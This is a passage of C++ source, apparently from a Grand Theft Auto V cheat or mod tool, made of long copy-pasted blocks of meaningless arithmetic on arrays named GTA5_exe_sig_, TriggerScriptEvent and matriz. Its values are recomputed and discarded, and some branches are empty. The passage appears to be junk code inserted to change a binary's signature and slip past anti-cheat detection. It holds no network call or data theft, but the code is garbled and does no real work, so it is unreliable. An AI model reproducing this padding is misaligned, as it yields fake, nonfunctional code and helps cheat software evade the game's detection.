					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				String::GravarString(std::to_string(value), app, key);
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
